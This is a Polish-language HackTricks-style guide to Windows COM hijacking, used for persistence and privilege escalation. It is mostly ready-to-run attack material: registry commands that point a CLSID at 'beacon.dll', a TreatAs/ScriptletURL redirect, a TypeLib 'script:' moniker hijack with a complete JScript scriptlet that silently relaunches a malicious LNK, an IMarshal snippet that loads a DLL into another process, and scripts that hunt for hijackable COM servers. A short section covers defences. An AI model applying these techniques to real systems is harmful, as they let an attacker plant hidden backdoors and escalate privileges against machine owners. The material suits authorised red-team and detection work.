# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Wyszukiwanie nieistniejących komponentów COM

Ponieważ użytkownicy mogą modyfikować wartości HKCU, **COM Hijacking** można wykorzystać jako **mechanizm persistence**. Za pomocą `procmon` łatwo znaleźć wyszukiwane rejestry COM, które jeszcze nie istnieją i mogą zostać utworzone przez atakującego. Klasyczne filtry:

- Operacje **RegOpenKey**.
- gdzie _Result_ to **NAME NOT FOUND**.
- a _Path_ kończy się na **InprocServer32**.

Przydatne warianty podczas poszukiwań:

- Szukaj również brakujących kluczy **`LocalServer32`**. Niektóre klasy COM są serwerami działającymi poza procesem i zamiast DLL uruchomią kontrolowany przez atakującego plik EXE.
- Oprócz `InprocServer32` szukaj operacji rejestru **`TreatAs`** i **`ScriptletURL`**. W najnowszych materiałach dotyczących wykrywania zagrożeń i analizach malware’u są one często wymieniane, ponieważ występują znacznie rzadziej niż zwykłe rejestracje COM, a więc są mocnym sygnałem.
- Podczas klonowania rejestracji do HKCU skopiuj prawidłowy **`ThreadingModel`** z oryginalnego `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32`. Użycie niewłaściwego modelu często uniemożliwia aktywację i sprawia, że hijack jest łatwy do wykrycia.<sup>[[3]](#references)</sup>
- W systemach 64-bitowych sprawdź widoki 64-bitowe i 32-bitowe (`procmon.exe` vs `procmon64.exe`, `HKLM\Software\Classes` i `HKLM\Software\Classes\WOW6432Node`), ponieważ aplikacje 32-bitowe mogą rozpoznawać inną rejestrację COM.

Gdy zdecydujesz już, który nieistniejący COM podszyć, wykonaj następujące polecenia. _Uważaj, jeśli zdecydujesz się podszyć pod COM ładowany co kilka sekund, ponieważ może to być przesada._

```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```

### Podatne na przejęcie komponenty COM Harmonogramu zadań

Zadania systemu Windows używają niestandardowych wyzwalaczy do wywoływania obiektów COM. Ponieważ są one uruchamiane za pośrednictwem Harmonogramu zadań, łatwiej przewidzieć, kiedy zostaną wywołane.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
  if ($Task.Actions.ClassId -ne $null)
  {
    if ($Task.Triggers.Enabled -eq $true)
    {
      $usersSid = "S-1-5-32-545"
      $usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

      if ($Task.Principal.GroupId -eq $usersGroup)
      {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
      }
    }
  }
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Na podstawie wyników możesz na przykład wybrać zadanie, które będzie uruchamiane **za każdym razem, gdy użytkownik się loguje**.

Po wyszukaniu CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** w **HKEY\CLASSES\ROOT\CLSID** oraz w HKLM i HKCU zwykle okaże się, że ta wartość nie istnieje w HKCU.

```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
               ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```

Następnie wystarczy utworzyć wpis HKCU. Za każdym razem, gdy użytkownik się zaloguje, uruchomi się Twój backdoor.

## Osierocone rejestracje COM i niestandardowy marshaling

Rejestracja COM dla całego komputera może stać się prymitywem DLL-planting bez modyfikowania rejestru. Poszukaj wartości `InprocServer32`, której DLL nie istnieje, a jej końcową ścieżkę może utworzyć lub zmodyfikować użytkownik o niskich uprawnieniach. Umieszczenie DLL o dokładnie takiej nazwie sprawia, że każdy proces aktywujący CLSID załaduje kod atakującego. W przykładzie CrossDevice zarejestrowana ścieżka to `%PROGRAMDATA%\CrossDevice\CrossDevice.Streaming.Source.dll`, więc zwykły użytkownik mógł utworzyć brakujący katalog podrzędny i DLL.<sup>[[5]](#references)</sup>

### Zapisywalne mapy wtyczek jako uprzywilejowane ścieżki aktywacji COM

Zapisywalna mapa identyfikatorów wtyczek na CLSID może pozwolić użytkownikowi o niższych uprawnieniach wybrać, który serwer COM działający w procesie załaduje uprzywilejowana usługa, nawet jeśli nie można edytować rejestracji klasy dla całego komputera.<sup>[[8]](#references)[[9]](#references)</sup> W opisywanym przypadku `InstallService` w Windows 11 zwykli użytkownicy mogli modyfikować `StaticPluginMap`; identyfikator wtyczki spoza wbudowanego zestawu wskazywał CLSID, który usługa `LocalSystem` przekazywała do `CoCreateInstance` z `CLSCTX_INPROC_SERVER` i `IID_IInstallServicePlugin`.<sup>[[8]](#references)[[9]](#references)</sup> Zarejestrowana DLL jest ładowana do procesu usługi, a nie do osobnego hosta COM.<sup>[[10]](#references)</sup>

Wymagane warunki to efektywne uprawnienie do zapisu mapy, możliwość wywołania żądania wtyczki oraz ścieżka DLL `InprocServer32`, nad którą użytkownik o niższych uprawnieniach ma kontrolę.<sup>[[8]](#references)[[9]](#references)</sup> W opisywanym przypadku warunek dotyczący ścieżki spełniała wspomniana wcześniej rejestracja CrossDevice.<sup>[[8]](#references)[[9]](#references)</sup> Pomyślnie utworzony obiekt wtyczki musi udostępniać żądany interfejs, ale DLL jest ładowana przed zakończeniem `CoCreateInstance`; brak tego interfejsu sam w sobie nie wyklucza wykonania kodu podczas ładowania.<sup>[[8]](#references)[[11]](#references)</sup> Ta ścieżka przez obsługę żądań usługi różni się od opisanej poniżej ścieżki z niestandardowym `IMarshal`. Więcej informacji o odrębnym prymitywie wykorzystującym ścieżkę pliku znajdziesz w artykule [DLL Hijacking](dll-hijacking/).

### `IMarshal` jako prymityw ładowania DLL między procesami

COM zwykle reprezentuje wskaźnik interfejsu za pomocą standardowego `OBJREF`, który kieruje odbiorcę z powrotem do pierwotnego obiektu. Obiekt implementujący `IMarshal` może zamiast tego utworzyć niestandardowy `OBJREF`. Jego metoda `GetUnmarshalClass` zwraca CLSID kodu, który odtworzy obiekt w procesie odbierającym. Ten CLSID nie musi identyfikować pierwotnego obiektu. COM rozwiązuje go jako serwer działający w procesie i ładuje zarejestrowaną DLL przed przekazaniem wywołania do żądanej metody interfejsu.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>

Minimalna złośliwa implementacja musi jedynie podstawić osierocony CLSID w `GetUnmarshalClass`.<sup>[[5]](#references)</sup>

```c
HRESULT STDMETHODCALLTYPE GetUnmarshalClass(
    REFIID riid, void *pv, DWORD dest_context,
    void *dest_context_ptr, DWORD flags, CLSID *clsid) override
{
    return CLSIDFromString(L"{DANGLING-CLSID}", clsid);
}
```

Przekaż ten obiekt jako parametr metody pośredniczonej, na przykład `[in] IUnknown *`. Inną opcją jest `CoGetInstanceFromIStorage`, przy czym obiekt z własnym marshalingiem musi też implementować wystarczającą część interfejsu `IStorage`, aby przejść lokalne kontrole. Automatyczne unmarshalingowanie w serwerze zdalnym rozwiązuje podstawiony CLSID, więc DLL zostaje załadowana, zanim zostanie wywołana metoda docelowa.<sup>[[5]](#references)</sup>

Ten prymityw nie ogranicza się do brakujących rejestracji. Może też zmusić odbiorcę do załadowania istniejącej DLL custom unmarshaler i ujawnić błędy w jej ścieżce ładowania lub unmarshalingu.<sup>[[5]](#references)</sup>

Łańcuch wymaga spełnienia wszystkich poniższych warunków:<sup>[[5]](#references)</sup>

1. Widoczny dla maszyny CLSID wskazuje brakującą lub możliwą do podmiany DLL in-process.
2. Atakujący może umieścić tę DLL w rozpoznanej ścieżce.
3. Aktywowalny serwer COM out-of-process działa z wymaganym poziomem uprawnień.
4. Serwer akceptuje custom marshaling i udostępnia wywołanie pośredniczone, które przenosi obiekt atakującego przez granicę procesu.

### Znajdowanie osieroconych serwerów in-process

[OleViewDotNet](https://github.com/tyranid/oleviewdotnet) i [NtObjectManager](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools) mogą wyliczyć maszynową bazę danych COM i przetestować każdy serwer przy użyciu standardowego mechanizmu rozpoznawania modułów Win32. To lepsze rozwiązanie niż `Test-Path`, ponieważ niektóre rejestracje zawierają tylko nazwę pliku i polegają na ścieżce wyszukiwania loadera.<sup>[[5]](#references)</sup>

```powershell
function Test-ComServer($Server) {
    try {
        Use-NtObject ($lib = Import-Win32Module -Path $Server -Flags AsDataFile) { $true }
    } catch { $false }
}

$db = Get-ComDatabase -LoadMode MachineOnly
$classes = Get-ComClass -Database $db -ServerType InProcServer32
$classes | Where-Object { -not (Test-ComServer $_.DefaultServer) } |
    Sort-Object DefaultServer | Select-Object Name, DefaultServer
```

Traktuj wynik jako listę kandydatów, a nie dowód podatności na exploit. Rozwiąż ścieżkę tak, jak robi to loader, a następnie sprawdź DACL pierwszego istniejącego katalogu nadrzędnego oraz docelowej biblioteki DLL, jeśli już istnieje. Brakujący plik ma znaczenie tylko wtedy, gdy atakujący może utworzyć lub podmienić ścieżkę, którą COM faktycznie rozwiąże.<sup>[[5]](#references)</sup>

### Wybierz i uruchom uprzywilejowany odbiornik

Sprawdź klasy COM pod kątem `RunAs`, powiązania z usługą, dostępnych interfejsów i serwerów proxy RPC. Klasa skonfigurowana dla `SYSTEM`, ale nieobsługiwana przez nazwaną usługę, może nie uruchomić się bezpośrednio, ponieważ RPCSS nie może jej uruchomić. W takim przypadku poszukaj nieuprzywilejowanego wyzwalacza, który uruchamia jej hosta, na przykład wykonywalnego zadania zaplanowanego, i odtwórz wszelkie wymagania wstępne dotyczące nazwanego zdarzenia lub IPC, które utrzymują serwer przy życiu.<sup>[[5]](#references)</sup>

Na przykład podatny łańcuch Shell Create Object Handler uruchamiał swojego hosta, tworząc oczekiwane zdarzenie globalne przed wywołaniem wykonywalnego zadania zaplanowanego przez użytkownika.<sup>[[5]](#references)</sup>

```powershell
$ev = New-NtEvent -Win32Path 'Global\ShellCreateObjectTaskReadyEvent' -InitialState $false
Start-ScheduledTask -TaskPath '\Microsoft\Windows\Shell\' -TaskName 'CreateObjectTask'
$ev.Wait()
$object = New-ComObject -Clsid '135fd325-45b7-4c30-89f8-4386961669f0'
```

Powiąż uzyskany obiektowy referencyjny z jego hostem i zweryfikuj zarówno tożsamość, jak i zasady marshalingu. Następnie wylicz interfejsy i przekonwertuj ich proxy do IDL, aby znaleźć parametr wejściowy, taki jak `IUnknown *`, który wykona marshaling fałszywego obiektu.<sup>[[5]](#references)</sup>

```powershell
$objref = Get-ComObjRef -Object $object
Get-ComProcess -ProcessId $objref.ProcessId |
    Select-Object Name, User, CustomMarshalAllowed

Get-ComInterface -Object $object
Get-ComInterface -Name '<interface>' | ConvertTo-ComSourceCode -Parse
```

### Zabezpieczenia przed niestandardowym marshalingiem

Odpowiedni odbiorca nie może odrzucać niezaufanych niestandardowych marshalerów. Dwa zabezpieczenia obejmujące cały proces to `EOAC_NO_CUSTOM_MARSHAL` w możliwościach przekazywanych do `CoInitializeSecurity` oraz `COMGLB_UNMARSHALING_POLICY_STRONG` ustawiane przez `IGlobalOptions::Set`. Przy dostępnych symbolach odpowiedni stan można sprawdzić w `combase!gCapabilities` i `combase!g_GLBOPT_UnmarshalingPolicy`; NtObjectManager udostępnia wynik jako `CustomMarshalAllowed` w przypadku obsługiwanych przez jego parser procesów z daną kompilacją Windows.<sup>[[5]](#references)</sup>

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` umożliwia emulowanie jednego CLSID przez inny.<sup>[[4]](#references)</sup> Z perspektywy ofensywnej oznacza to, że można pozostawić oryginalny CLSID bez zmian, utworzyć drugi CLSID dla bieżącego użytkownika, wskazujący na `scrobj.dll`, a następnie przekierować rzeczywisty obiekt COM do złośliwego za pomocą `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`.

Przydaje się to, gdy:

- aplikacja docelowa tworzy już obiekt o stabilnym CLSID podczas logowania lub uruchamiania
- chcesz przekierować obiekt wyłącznie przez rejestr, zamiast zastępować oryginalny `InprocServer32`
- chcesz wykonać lokalny lub zdalny skryptlet `.sct` za pomocą wartości `ScriptletURL`

Przykładowy przebieg (na podstawie publicznych technik Atomic Red Team i wcześniejszych badań nad nadużywaniem rejestru COM):

```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```

Uwagi:

- `scrobj.dll` odczytuje wartość `ScriptletURL` i wykonuje wskazany plik `.sct`, więc payload może być lokalnym plikiem albo być pobierany zdalnie przez HTTP/HTTPS.
- `TreatAs` jest szczególnie przydatne, gdy oryginalna rejestracja COM w HKLM jest kompletna i stabilna, ponieważ wystarczy niewielkie przekierowanie dla użytkownika zamiast kopiowania całego drzewa.
- Aby przeprowadzić walidację bez czekania na naturalny wyzwalacz, możesz ręcznie utworzyć instancję fałszywego ProgID/CLSID za pomocą `rundll32.exe -sta <ProgID-or-CLSID>`, jeśli klasa docelowa obsługuje aktywację STA.

## COM TypeLib Hijacking (script: utrwalenie za pomocą monikera)

Biblioteki typów (TypeLib) definiują interfejsy COM i są ładowane za pomocą `LoadTypeLib()`. Gdy tworzony jest obiekt serwera COM, system operacyjny może również załadować powiązaną TypeLib, odwołując się do kluczy rejestru w `HKCR\TypeLib\{LIBID}`. Jeśli ścieżka TypeLib zostanie zastąpiona **monikerem**, np. `script:C:\...\evil.sct`, Windows wykona scriptlet podczas rozwiązywania TypeLib — zapewniając w ten sposób skryte utrwalenie, które uruchamia się przy użyciu popularnych komponentów.

Zaobserwowano to w przypadku kontrolki Microsoft Web Browser (często ładowanej przez Internet Explorer, aplikacje osadzające WebBrowser, a nawet `explorer.exe`).<sup>[[1]](#references)[[2]](#references)</sup>

### Kroki (PowerShell)

1) Zidentyfikuj TypeLib (LIBID) używaną przez często aktywowany CLSID. Przykładowy CLSID często wykorzystywany w łańcuchach malware: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).

```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```

2) Ustaw ścieżkę TypeLib dla użytkownika na lokalny scriptlet przy użyciu monikera `script:` (nie są wymagane uprawnienia administratora):

```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```

3) Umieść minimalny plik JScript `.sct`, który ponownie uruchamia główny payload (np. plik `.lnk` używany w początkowym łańcuchu):

```xml
<?xml version="1.0"?>
<scriptlet>
  <registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
  <script language="JScript">
    <![CDATA[
      try {
        var sh = new ActiveXObject('WScript.Shell');
        // Re-launch the malicious LNK for persistence
        var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
        sh.Run(cmd, 0, false);
      } catch(e) {}
    ]]>
  </script>
</scriptlet>
```

4) Uruchomienie – otwarcie IE, aplikacji osadzającej kontrolkę WebBrowser lub nawet zwykła aktywność Eksploratora spowoduje załadowanie TypeLib i wykonanie scriptletu, ponownie uzbrajając łańcuch przy logowaniu/ponownym uruchomieniu.

Sprzątanie
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```

Uwagi
- Możesz zastosować tę samą logikę do innych często używanych komponentów COM; zawsze najpierw pobierz rzeczywisty `LIBID` z `HKCR\CLSID\{CLSID}\TypeLib`.
- W systemach 64-bitowych możesz również utworzyć podklucz `win64` dla procesów 64-bitowych.

## References

- [1] [Przejmij TypeLib – nowa technika utrwalania COM (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [2] [Check Point Research – kampania ZipLine: zaawansowany atak phishingowy wymierzony w firmy w USA](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Ponowne spojrzenie na COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [4] [Klucz CLSID (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)
- [5] [Project Zero – Techniki wykorzystywania luk w Windows: osierocone rejestracje obiektów COM](https://projectzero.google/2026/09/windows-dangling-com.html)
- [6] [Microsoft Learn – interfejs IMarshal](https://learn.microsoft.com/en-us/windows/win32/api/objidl/nn-objidl-imarshal)
- [7] [Microsoft Open Specifications – OBJREF w MS-DCOM](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/fe6c5e46-adf8-4e34-a8de-3f756c875f31)
- [8] [PoC Dark Elevator i opracowanie techniczne (califio)](https://github.com/califio/publications/tree/main/MADBugs/windows-CVE-2026-50343)
- [9] [Dark Elevator: eskalacja uprawnień lokalnych w usłudze instalacji Windows (calif.io)](https://blog.calif.io/p/dark-elevator-windows-install-service)
- [10] [Wyliczenie CLSCTX (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/wtypesbase/ne-wtypesbase-clsctx)
- [11] [Funkcja CoCreateInstance (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-cocreateinstance)
{{#include ../../banners/hacktricks-training.md}}

